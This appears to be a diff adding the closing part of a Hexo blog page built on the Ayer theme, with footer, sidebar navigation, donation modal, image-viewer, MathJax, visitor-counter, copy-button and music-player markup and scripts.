+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        
+        Powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+        <span class="division">|</span>
+        Theme - <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>Visitors:<span id="busuanzi_value_site_uv"></span></s>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>Views:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/avatar.jpg" alt="Pz1o"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">Home</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">Archive</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">Catego</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">Tags</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">About</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="Search">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+      tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+  });
+
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for(i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+  var ayerConfig = {
+    mathjax: true
+  }
+</script>
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script>
+
+<script src="/js/clickBoom1.js"></script>
+
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+<script src="/js/dz.js"></script>
+
+
+
+    
+    <div id="music">
+    
+    
+    
+    <iframe frameborder="no" border="1" marginwidth="0" marginheight="0" width="200" height="52"
+        src="//music.163.com/outchain/player?type=2&id=22707008&auto=0&height=32"></iframe>
+</div>
+
+<style>
+    #music {
+        position: fixed;
+        right: 15px;
+        bottom: 0;
+        z-index: 998;
+    }
+</style>
+    
+  </div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<!-- <script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>-->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+</body>
+
+</html>
